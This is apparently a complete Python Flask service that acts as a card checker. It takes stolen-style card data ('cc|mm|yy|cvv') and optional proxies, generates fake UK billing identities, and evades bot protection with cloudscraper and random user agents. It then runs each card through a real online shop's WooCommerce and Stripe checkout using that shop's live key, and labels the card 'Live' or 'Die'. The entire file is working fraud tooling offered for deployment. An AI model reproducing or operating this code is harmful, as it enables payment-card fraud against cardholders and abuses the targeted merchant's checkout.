from flask import Flask, request, jsonify
import cloudscraper
from fake_useragent import UserAgent
from datetime import datetime
from faker import Faker
from urllib.parse import quote_plus
import json
import time
import random
import re
import os
import requests

app = Flask(__name__)

DELAY_BETWEEN_REQUESTS = 2
DELAY_RANDOM_RANGE = 1

def random_delay():
    delay = DELAY_BETWEEN_REQUESTS + random.uniform(0, DELAY_RANDOM_RANGE)
    time.sleep(delay)

def format_proxy(proxy_string):
    """Convert proxy string to proper format"""
    if not proxy_string:
        return None
    
    if proxy_string.startswith(('http://', 'https://')):
        return proxy_string
    
    parts = proxy_string.split(':')
    
    if len(parts) == 4:
        host, port, username, password = parts
        return f"http://{username}:{password}@{host}:{port}"
    elif len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    else:
        return f"http://{proxy_string}"

def get_card_info_from_binlist(card_number):
    """Get card information from binlist.net API"""
    bin_number = card_number[:6]
    
    try:
        # Use binlist.net API
        url = f"https://lookup.binlist.net/{bin_number}"
        headers = {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            # Map binlist response to our format
            card_info = {
                "bank": data.get('bank', {}).get('name', 'Unknown Bank'),
                "type": data.get('type', 'unknown').lower(),
                "category": data.get('scheme', 'unknown').lower(),
                "brand": data.get('brand', 'Unknown Card'),
                "country": {
                    "name": data.get('country', {}).get('name', 'Unknown Country'),
                    "code": data.get('country', {}).get('alpha2', 'XX'),
                    "emoji": get_country_emoji(data.get('country', {}).get('alpha2', 'XX')),
                    "currency": data.get('country', {}).get('currency', 'XXX'),
                    "location": {
                        "latitude": data.get('country', {}).get('latitude', 0),
                        "longitude": data.get('country', {}).get('longitude', 0)
                    }
                }
            }
            return card_info
        else:
            return get_fallback_card_info(card_number)
            
    except Exception as e:
        print(f"BIN lookup error: {e}")
        return get_fallback_card_info(card_number)

def get_country_emoji(country_code):
    """Convert country code to emoji flag"""
    if not country_code or len(country_code) != 2:
        return "🏳️"
    
    # Simple emoji conversion (A -> 🇦, B -> 🇧, etc.)
    offset = 127397
    try:
        return chr(ord(country_code[0]) + offset) + chr(ord(country_code[1]) + offset)
    except:
        return "🏳️"

def get_fallback_card_info(card_number):
    """Fallback card info if binlist API fails"""
    # Basic card type detection
    if card_number.startswith('4'):
        card_type = "visa"
        scheme = "visa"
        brand = "Visa Classic"
        bank = "Visa Issuing Bank"
    elif card_number.startswith('5'):
        card_type = "mastercard"
        scheme = "mastercard"
        brand = "Mastercard Standard"
        bank = "Mastercard Issuing Bank"
    elif card_number.startswith('3'):
        card_type = "amex"
        scheme = "amex"
        brand = "American Express"
        bank = "American Express"
    elif card_number.startswith('6'):
        card_type = "discover"
        scheme = "discover"
        brand = "Discover Card"
        bank = "Discover Bank"
    else:
        card_type = "unknown"
        scheme = "unknown"
        brand = "Unknown Card"
        bank = "Unknown Bank"
    
    return {
        "bank": bank,
        "type": card_type,
        "category": scheme,
        "brand": brand,
        "country": {
            "name": "United States of America",
            "code": "US",
            "emoji": "🇺🇸",
            "currency": "USD",
            "location": {"latitude": 38, "longitude": -97}
        }
    }

def process_payment(card_data, proxy=None):
    try:
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )

        formatted_proxy = format_proxy(proxy)
        
        if formatted_proxy:
            proxies = {
                "http": formatted_proxy,
                "https": formatted_proxy,
            }
            scraper.proxies = proxies

        fake = Faker('en_GB')
        first_name = fake.first_name()
        last_name = fake.last_name()
        address_1 = fake.street_address()
        city = fake.city()
        state = fake.random_element(elements=(
            'London', 'Manchester', 'Yorkshire', 'Essex', 
            'Kent', 'Lancashire', 'West Midlands', 'Glasgow',
            'Edinburgh', 'Birmingham', 'Liverpool', 'Bristol',
            'Sheffield', 'Leeds', 'Cardiff', 'Belfast',
            'Nottingham', 'Leicester', 'Coventry', 'Hull',
            'Newcastle', 'Brighton', 'Portsmouth', 'Southampton',
            'Norfolk', 'Suffolk', 'Devon', 'Cornwall',
            'Dorset', 'Somerset', 'Cheshire', 'Shropshire',
            'Derbyshire', 'Nottinghamshire', 'Lincolnshire',
            'Northumberland', 'Durham', 'Cumbria', 'North Yorkshire',
            'West Yorkshire', 'South Yorkshire', 'Merseyside',
            'Greater Manchester', 'West Midlands', 'Warwickshire',
            'Staffordshire', 'Hertfordshire', 'Buckinghamshire',
            'Oxfordshire', 'Gloucestershire', 'Cambridgeshire',
            'Worcestershire', 'Herefordshire', 'Bedfordshire',
            'Berkshire', 'Surrey', 'Sussex', 'Hampshire',
            'Isle of Wight', 'Wiltshire', 'Northamptonshire',
            'Rutland', 'Monmouthshire', 'Glamorgan', 'Gwent',
            'Dyfed', 'Powys', 'Gwynedd', 'Clwyd',
            'Strathclyde', 'Lothian', 'Grampian', 'Tayside',
            'Fife', 'Central', 'Borders', 'Dumfries and Galloway',
            'Highland', 'Islands', 'Antrim', 'Down',
            'Armagh', 'Londonderry', 'Tyrone', 'Fermanagh'
        ))
        postcode = fake.postcode()
        email = fake.email(domain='gmail.com')
        phone = fake.phone_number()
        name = f"{first_name}+{last_name}"
        email_encoded = quote_plus(email)
        ua = UserAgent()
        user_agent = ua.random

        billing_country = 'GB'
        billing_address_1 = quote_plus(address_1)
        billing_address_2 = ''
        billing_city = quote_plus(city)
        billing_state = quote_plus(state)
        billing_postcode = quote_plus(postcode)
        billing_phone = quote_plus(phone)

        card = card_data
        cc, mm, yy, ccv = card.split("|")
        if yy.startswith('20'):
            yy = yy[2:]

        # Get dynamic card information from binlist API
        card_info = get_card_info_from_binlist(cc)

        # ========== ACTUAL PAYMENT PROCESSING START ==========
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'user-agent': user_agent,
        }

        # Step 1: Visit product page
        response = scraper.get(
            'https://www.balliante.com/store/product/2-m-high-speed-hdmi-cable-hdmi-m-m/',
            headers=headers,
        )
        random_delay()

        # Step 2: Add to cart
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'cache-control': 'max-age=0',
            'origin': 'null',
            'priority': 'u=0, i',
            'user-agent': user_agent,
        }

        params = {
            'quantity': '1',
            'add-to-cart': '5360',
        }

        response = scraper.post(
            'https://www.balliante.com/store/product/2-m-high-speed-hdmi-cable-hdmi-m-m/',
            headers=headers,
            params=params,
        )
        random_delay()

        # Step 3: Go to checkout
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'priority': 'u=0, i',
            'user-agent': user_agent,
        }

        response = scraper.get('https://www.balliante.com/store/checkout/', headers=headers)
        random_delay()

        # Step 4: Extract nonces
        html = response.text
        noncewo = html.split('name="woocommerce-process-checkout-nonce"')[1].split('value="')[1].split('"')[0]
        noncelogin = html.split('name="woocommerce-login-nonce"')[1].split('value="')[1].split('"')[0]

        # Step 5: Create payment method with Stripe
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent,
        }

        data = (
            f'billing_details[name]={name}&'
            f'billing_details[email]={email_encoded}&'
            f'billing_details[phone]={billing_phone}&'
            f'billing_details[address][city]={billing_city}&'
            f'billing_details[address][country]=GB&'
            f'billing_details[address][line1]={billing_address_1}&'
            f'billing_details[address][line2]=&'
            f'billing_details[address][postal_code]={billing_postcode}&'
            f'billing_details[address][state]={billing_state}&'
            f'type=card&'
            f'card[number]={cc}&'
            f'card[cvc]={ccv}&'
            f'card[exp_year]={yy}&'
            f'card[exp_month]={mm}&'
            f'allow_redisplay=unspecified&'
            f'payment_user_agent=stripe.js%2F4209db5aac%3B+stripe-js-v3%2F4209db5aac%3B+payment-element%3B+deferred-intent&'
            f'referrer=https%3A%2F%2Fwww.balliante.com&'
            f'key=pk_live_51Fftn2B5suwcKLEosnFZXZigPCvwIRldF9bqwCyzcOzNqfYfdGLfO88GdBYH46sGide0qSHP7WMbm6rrV2KQKlst00Nff2HGzm&'
        )

        response = scraper.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        random_delay()
        
        if response.status_code != 200:
            return {
                "code": 0,
                "status": "Die",
                "message": "Card validation failed",
                "card": {
                    "card": card_data,
                    **card_info
                }
            }
            
        stripe_account = response.headers.get('Stripe-Account')
        json_data = response.json()
        idstripe = json_data['id']

        # Step 6: Process checkout
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.balliante.com',
            'priority': 'u=1, i',
            'user-agent': user_agent,
        }

        params = {
            'wc-ajax': 'checkout',
        }

        data = (
            f'username=&'
            f'password=&'
            f'woocommerce-login-nonce={noncelogin}&'
            f'_wp_http_referer=https%3A%2F%2Fwww.balliante.com%2Fstore%2Fcheckout%2F%3FelementorPageId%3D118%26elementorWidgetId%3D2722c17&'
            f'redirect=https%3A%2F%2Fwww.balliante.com%2Fstore%2Fcheckout%2F&'
            f'wc_order_attribution_session_entry=https%3A%2F%2Fwww.balliante.com%2Fstore%2Fproducts%2F&'
            f'billing_email={email_encoded}&'
            f'billing_first_name={first_name}&'
            f'billing_last_name={last_name}&'
            f'billing_country=GB&'
            f'billing_address_1={billing_address_1}&'
            f'billing_address_2=&'
            f'billing_city={billing_city}&'
            f'billing_state={billing_state}&'
            f'billing_postcode={billing_postcode}&'
            f'billing_phone={billing_phone}&'
            f'shipping_first_name=&'
            f'shipping_last_name=&'
            f'shipping_country=GB&'
            f'shipping_address_1=&'
            f'shipping_address_2=&'
            f'shipping_city=&'
            f'shipping_state=&'
            f'shipping_postcode=&'
            f'shipping_phone=&'
            f'order_comments=&'
            f'shipping_method%5B0%5D=flat_rate%3A1&'
            f'coupon_code=&'
            f'payment_method=stripe&'
            f'wc-stripe-payment-method-upe=&'
            f'wc_stripe_selected_upe_payment_type=&'
            f'wc-stripe-is-deferred-intent=1&'
            f'woocommerce-process-checkout-nonce={noncewo}&'
            f'wc-stripe-payment-method={idstripe}'
        )

        response = scraper.post('https://www.balliante.com/store/', params=params, headers=headers, data=data)
        random_delay()

        response_data = response.json()
        
        # Step 7: Analyze payment result
        if response_data.get('result') == 'success':
            result = {
                "code": 1,
                "status": "Live",
                "message": "Payment successful"
            }
        elif 'redirect' in response_data:
            result = {
                "code": 2,
                "status": "Live", 
                "message": "3D Secure required"
            }
        else:
            error_message = response_data.get('messages', 'Your card was declined')
            result = {
                "code": 0,
                "status": "Die",
                "message": error_message
            }

        # Add real card info from binlist
        result["card"] = {
            "card": card_data,
            **card_info
        }
        
        return result

    except Exception as e:
        card_info = get_card_info_from_binlist(card_data.split("|")[0]) if card_data else get_fallback_card_info("000000")
        
        return {
            "code": -1,
            "status": "Error", 
            "message": str(e),
            "card": {
                "card": card_data or "Unknown",
                **card_info
            }
        }

@app.route('/')
def home():
    return jsonify({"message": "Payment Processor API", "status": "running"})

@app.route('/process', methods=['POST'])
def process():
    try:
        data = request.get_json()
        
        if not data or 'card' not in data:
            return jsonify({
                "code": -1,
                "status": "Error",
                "message": "Card data is required"
            }), 400
        
        card_data = data['card']
        proxy = data.get('proxy')
        
        if not re.match(r'^\d+\|\d+\|\d+\|\d+$', card_data):
            return jsonify({
                "code": -1,
                "status": "Error",
                "message": "Invalid card format. Use: cc|mm|yy|cvv"
            }), 400
        
        result = process_payment(card_data, proxy)
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "code": -1,
            "status": "Error",
            "message": str(e)
        }), 500

@app.route('/index.php')
def process_get():
    try:
        site = request.args.get('site', 'default')
        cc = request.args.get('cc')
        proxy = request.args.get('proxy')
        
        if not cc:
            return jsonify({
                "code": -1,
                "status": "Error",
                "message": "Card data is required"
            }), 400
        
        if not re.match(r'^\d+\|\d+\|\d+\|\d+$', cc):
            return jsonify({
                "code": -1,
                "status": "Error",
                "message": "Invalid card format. Use: cc|mm|yy|cvv"
            }), 400
        
        result = process_payment(cc, proxy)
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "code": -1,
            "status": "Error", 
            "message": str(e)
        }), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# Vercel compatibility
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)), debug=False)
